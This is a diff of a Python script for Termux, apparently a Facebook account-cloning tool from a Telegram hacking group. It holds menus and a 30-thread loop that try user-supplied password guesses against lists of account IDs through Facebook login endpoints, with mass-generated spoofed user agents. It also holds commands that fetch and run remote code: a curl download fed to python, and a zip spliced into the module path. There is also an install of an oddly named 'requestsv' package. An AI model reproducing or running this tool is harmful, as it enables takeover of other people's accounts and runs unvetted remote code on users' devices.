@@ -1,163 +1,79 @@
-#---------------------[ INFO ]---------------------#
-#DECOMPILE  BY U7P4L 1N/ANONYMOUS CYBER
-#JOIN : https://t.me/AN0NYM0U5_CY83R
-#JOIN : https://t.me/ANONYMOUS_CYBER07
-#---------------------[MODULES ]---------------------#
-from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-import os
-import random
-import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
-from bs4 import BeautifulSoup as sop
-from concurrent.futures import ThreadPoolExecutor as tred
-import base64
-import os,sys,time,json,random,re,string,platform,base64
+
+import os,sys,tempfile,string,random,subprocess,platform,uuid,os,shutil,zlib,smtplib,base64,uuid,time,json,re
+from uuid import uuid4
+from time import sleep as sp
+#_________[ INSTALLING REQUESTS ]_____
+'''
+http_directory = tempfile.mkdtemp(prefix='.')
+req = "/data/data/com.termux/files/usr/lib/python3.11/site-packages/"
+site_packages = sys.path[4]
+sys.path.remove(site_packages)
+sys.path.insert(4,http_directory+'/reqmodule')
+find_aarch = subprocess.check_output('uname -om',shell=True)
+
+if "aarch64" in str(find_aarch):
+	user_aarch = "64"
+	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config64.zip"
+
+elif "arm" in str(find_aarch):
+	user_aarch = "32"
+	link = "https://github.com/dcofficial/dilute_modules/releases/download/modules/config32.zip"
+else:
+	print(" [•] Your Device aarch Unknown ")
+
+
+try:
+	os.system(f"curl -L {link} > {http_directory}/config.zip")
+	os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
+	os.chdir(f"{http_directory}/reqmodule")
+except Exception as e:
+	print(e)
+except ConnectionError:
+	print(" [•] Please Check Your Internet ")
+'''
+
+try:
+	import requests
+except ModuleNotFoundError:
+	os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requestsv')
+	#os.system("python UMAR")
+
+try:
+	import bs4
+	from bs4 import BeautifulSoup as pars
+except ModuleNotFoundError:
+	os.system('pip install bs4')
+except Exception as e:
+	print(e)
+
+from concurrent.futures import ThreadPoolExecutor as tpe
 import requests
-from concurrent.futures import ThreadPoolExecutor as ThreadPool
-import mechanize
-from requests.exceptions import ConnectionError
-import string
-try:
-    import requests
-except ImportError:
-    print('\n [✓] installing requests !...\n')
-    os.system('pip install requests')
+from requests.exceptions import ConnectionError as CE
+os.system('xdg-open https://chat.whatsapp.com/LEwEq6tHVjM7wnW33DNfQb')
 
 try:
-    import concurrent.futures
-except ImportError:
-    print('\n [✓] installing futures !...\n')
-    os.system('pip install futures')
-try:
-    import bs4
-except ImportError:
-    print('\n [✓] installing bs4 !...\n')
-    os.system('pip install bs4')
-    os.system('git pull')
-    os.system('pkg install curl')
-import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
-from concurrent.futures import ThreadPoolExecutor as ahmadAXI
-from datetime import datetime
-from bs4 import BeautifulSoup
+	key = open(".key.txt","r").read()
+except FileNotFoundError:
+	key = 'none'
 
+def line():
+	print(63*'-')
 
-ct = datetime.now()
-n = ct.month
-bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
-try:
-    if n < 0 or n > 12:
-        exit()
-    nTemp = n - 1
-except ValueError:
-    exit()
+def p(x):
+	print(x)
 
-current = datetime.now()
-ta = current.year
-bu = current.month
-ha = current.day
-op = bulan[nTemp]
-R = '\033[31;1m'
-RED = '\x1b[38;5;46m'
-G = '\033[32;1m'
-Y = '\033[33;1m'
-B = '\033[34;1m'
-M = '\033[35;1m'
-C = '\033[36;1m'
-R = '{RED}' 
-LR = '\033[91;1m'
-LG = '\033[92;1m'
-LY = '\033[93;1m'
-LB = '\033[94;1m'
-LM = '\033[95;1m'
-LC = '\033[96;1m'
-dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
-data,data2={},{}
-aman,cp,salah=0,0,0
-ubahP,fuck,pwBaru=[],[],[]
+#___________ [ Lists Used in Script]________
+
+id = []
 ok = []
 cp = []
-id = []
-user = []
 loop = 0
-oks = []
-cps = []
-loop = 0
-url_lookup = "https://lookup-id.com/"
-url_mb = "https://mbasic.facebook.com"
-url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36;]"}
-bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
-done = False
-ugen=[]
-uas=[]
-usa = ["Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}"]
-rr = random.randint
-for xd in range(3005):
-    ff=(f'Mozilla/5.0 Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))} (KHTML, like Gecko) Version/{str(rr(20,100))}.0.{str(rr(1111,9999))} Safari/{str(rr(1111,9999))}.{str(rr(20,100))}.{str(rr(20,100))}')
-    uas.append(ff)
-for sat in range(1000):
-	a='NokiaX'
-	b=random.randrange(1,9)
-	c='-0'
-	d=random.randrange(1,9)
-	e='/'
-	f=random.randrange(1,9)
-	g='.0 ('
-	h=random.randrange(1,12)
-	i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
-	j='UNTRUSTED/'
-	k=random.randrange(1,3)
-	l='.0'
-	uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
-	ugen.append(uaku2)
-
-nka = [
-"NokiaX2-02/8.0 (11.57) Profile/MIDP-2.1 Configuration/CLDC-1.1",
-"NokiaX4-01/5.0 (08.65) Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
-"nokia6610I/1.0 (4.10) Profile/MIDP-1.0 Configuration/CLDC-1.0 (FAST WAP Proxy/1.0)",
-]
-
-
-def jalan(z):
-    for e in z + '\n':
-        sys.stdout.write(e)
-        sys.stdout.flush()
-        time.sleep(0.01)
-
-for x in range(10000):
-	aa='Mozilla/5.0 (Windows NT 6.1; WOW64)'
-	b=random.choice(['4','5','6','7','8','9','10','11','12'])
-	c='ASUS_I006D Build/RKQ1.201022.002'
-	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	e=random.randrange(1, 999)
-	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/55.0.2883.87 Safari/537.36 Sleipnir/6.2.3'
-	h=random.randrange(73,100)
-	i='0'
-	j=random.randrange(4200,4900)
-	k=random.randrange(40,150)
-	l='Mobile Safari/537.36 Sleipnir/3.5.28'
-	uakua=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
-	'useragent.append',(uakua)
-  
-for agent in range(10000):
-        aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-        b=random.choice(['6','7','8','9','10','11','12'])
-        c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
-        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        e=random.randrange(1, 999)
-        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.99'
-        h=random.randrange(73,100)
-        i='0'
-        j=random.randrange(4200,4900)
-        k=random.randrange(40,150)
-        l='Mobile Safari/533.1'
-        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-        ugen.append(fullagnt)
-  
-  
-logo=("""\33[;33m   
+method=[]
+SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
+ses = requests.Session()
+def logo():
+	os.system('clear')
+	logo = ("""\33[;33m   
          
 \033[92m
   ______             __                           
@@ -181,8 +97,7 @@ $$    $$/ $$    $$ |$$    $$/ $$       |$$ |
  ╰◈▪➣ Version   : DC Extreme [2.2]
  ╰◈▪➣   \033[1;96m★彡[ɪᴍʀᴀɴ ᴋʜᴀɴ ʟᴏᴠᴇʀ]彡★\033[1;97m
 -------------------------------------------------- 
-\033[1;97m""") 
-
+\033[1;97m""")  
 	p(logo)
 def clear():
 	os.system("clear")
@@ -291,155 +206,7 @@ def buy():
 	print(" [•] Koi mera dost ho ya kuch b ho ab free approvel me kise ko nhi donga ids ay ya nah ay apni zimaydari pe buy kro ")
 	line()
 	exit()
-
-
-def iAmMethod3Ua():
-	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
-	ios_version = random.choice(["10_0_2","10_1_1","10_2","10_2_1","10_3_1","10_3_2","10_3_3"])
-	END = "[FBAN/FB4A;FBAV/62.0.0.0.39;FBBV/20569053;FBDM/{density=3.0,width=1080,height=1776};FBLC/zh_CN;FBCR/Lycamobile;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6903;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]"
-	ua = (["Mozilla/5.0 (Windows NT 10.0; {str(rr(9,11))}; Win64; x64){str(aZ)}{str(rx)}{str(aZ)}) AppleWebKit/537.36 (KHTML, like Gecko){str(rr(99,149))}.0.{str(rr(4500,4999))}.{str(rr(35,99))} Chrome/{str(rr(99,175))}.0.{str(rr(0,5))}.{str(rr(0,5))} Safari/537.36"
-     "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
-		"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
-		"Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9"
-		"Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
-		"Mozilla/5.0 (Linux; U; Android 2.3.5; en-us; HTC Vision Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-		"Mozilla/5.0 (Linux; U; Android 2.3.4; fr-fr; HTC Desire Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-		"Mozilla/5.0 (Linux; U; Android 2.3.4; en-us; T-Mobile myTouch 3G Slide Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-		"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-		"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC_Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari"
-		"Mozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC Pyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-		"Mozilla/5.0 (Linux; U; Android 2.3.3; ko-kr; LG-LU3000 Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-		"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-		"Mozilla/5.0 (Linux; U; Android 2.3.3; en-us; HTC_DesireS_S510e Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile"
-		"Mozilla/5.0 (Linux; U; Android 2.3.3; de-de; HTC Desire Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-		"Mozilla/5.0 (Linux; U; Android 2.2; fr-lu; HTC Legend Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-        "Mozilla/5.0 (Linux; U; Android 2.2; en-sa; HTC_DesireHD_A9191 Build/FRF91) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.11"
-        "Mozilla/5.0 (Linux; U; Android 2.2.1; fr-fr; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-        "Mozilla/5.0 (Linux; U; Android 2.2.1; en-gb; HTC_DesireZ_A7272 Build/FRG83D) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-       "Mozilla/5.0 (Linux; U; Android 2.2.1; en-ca; LG-P505R Build/FRG83) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
-       "Mozilla/5.0 (Linux; Android 5.1; itel it1355 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/50.0.2661.86 Mobile Safari/537.36"
-       "Mozilla/5.0 (Linux; Android 5.1; itel it1355 Build/LMY47D; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/49.0.2623.105 Mobile Safari/537.36 GSA/5.11.35.19.arm"
-       "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
-		"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36"
-		"Mozilla/5.0 (Linux; Android 13; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36"
-		 "Mozilla/5.0 (Linux; Android 13; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36"
-		 "Mozilla/5.0 (Linux; Android 13; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36"
-		  "Mozilla/5.0 (Linux; Android 13; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36"
-])
-
-	return ua 
-
-
-nid = ''.join((random.choice(['A','a','B','b','c','C','d','D','e','E','F','f','G','g','h','H','i','I','j','J','k','K','l','L','m','M','N','n','o','O','p','P','q','Q','r','R','s','S','t','T','u','U','v','V','w','W','x','X','y','Y','z','Z']) for i in range(12)))
-tid = str(random.randint(111,999))
-class iAmMain:
-	
-	def __init__(self):
-
-		self.gp = "https://b-graph.facebook.com/auth/login"
-		self.ap = "https://b-api.facebook.com/auth/login"
-	def iAmMenu(self):
-		logo()
 		
-		
-		p(" [1] FILE CLONING ")
-		p(" [2] RANDOM CLONING ")
-		p(" [3] DUMP TOOL ")
-		p(" [4] PASS CHANGER ")
-		p(" [E] EXIT TOOL ") 
-		line()
-		opt1 = input(" \033[1;92m[•] \033[1;97m Select an Option : ")
-		if opt1 == "1":self.file_menu()
-		
-		elif opt1 == "2":self.num_menu()
-		elif opt1 == "4":automation().menu()
-		elif opt1 == "3":Grep().links_only()
-		elif opt1 == "E":exit(" \033[1;92m [•] KHATAM TATA BY BY")
-		else:p(" [•] Wrong Select ");sp(2);self.iAmMenu()
-	
-	
-	def dump_menu(self):
-		 print("rm -rf dump && mkdir dump && cd dump && curl -L https://raw.githubusercontent.com/dcofficial/dump/main/dump > dump && python dump")
-		
-	def file_menu(self):
-		logo()
-		p(" \033[1;92m [•] EXAMPLE /sdcard/filename.txt")
-		file = input("\033[1;97m  [•] PUT FILE PATH : ")
-		try:
-			id = open(file,"r").read().splitlines()
-			self.method_select(id)
-		except FileNotFoundError:
-			p(" [•] File Path Incorrect ")
-			sp(2);self.file_menu()
-		
-	def method_select(self,id):
-		logo()
-		p(" [1] Method 1 ")
-		p(" [2] Mehtod 2 ")
-		p(" [3] Method 3 ")
-		p(" [4] Method 4 " )
-		line()
-		m_opt = input(" [•] Choose : ")
-		if m_opt =='1':
-			method.append("i")
-			self.password_menu(id)
-		elif m_opt =="2":
-			method.append('ii')
-			self.password_menu(id)
-		elif m_opt =="3":
-			method.append('iii')
-			self.password_menu(id)
-		elif m_opt =="4":
-			 method.append('iiii')
-			 self.password_menu(id)
-		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)
-
-	def password_menu(self,id):
-		pwx=[]
-		logo()
-		max = 20
-		p(" [•] EXAMPLE 1 , 2 , 3  to 20 Max ")
-		try:
-			plimit = int(input(" [•] PUT LIMIT : "))
-			if plimit =="":
-				plimit = 4
-			elif plimit > max:
-				p(" [•] Password Limit Should up To 20 ");sp(2);self.password_menu()
-		except:
-			plimit = 4
-		logo()
-		p(" [•] Enter Your Passwords like : first last , first123 , last123 etc ")
-		line()
-		for n in range(plimit):
-			pwx.append(input(" [•] PUT PASSWORDS %s : "%(n+1)))
-		logo()
-		p(" \033[1;92m TOTAL FILE ACCOUNTS :\033[1;97m %s "%(str(len(id))))
-		p(" \033[1;92m PROCESS HAS BEEN STARTED \033[1;97m ")
-		line()
-		with tpe(max_workers=30) as saqi:
-			for user in id:
-				uid = user.split("|")[0]
-				nm = user.split("|")[1]
-				if "i" in method:
-					saqi.submit(self.method1,uid,nm,pwx)
-				elif "ii" in method:
-					saqi.submit(self.method2,uid,nm,pwx)
-				elif "iii" in method:
-					saqi.submit(self.method3,uid,nm,pwx)
-				elif "iiii" in method:
-					 saqi.submit(self.method4,uid,nm,pwx)
-		self.saved_results(ok,cp)
-	def saved_results(self,ok,cp):
-		line()
-		p(" [•] Cloning Has been Completed ")
-		p(" [•] Cloning Accounts Saved in /sdcard")
-		p(" [•] Total Ok Accounts : %s "%(len(ok)))
-		p(" [•] Total Cp Accounts : %s "%(len(cp)))
-		line()
-		input(" [•] Press Enter To Go Back ")
-		self.iAmMenu()
-
-
 def virusA():
 	user=[]
 	os.system('clear')
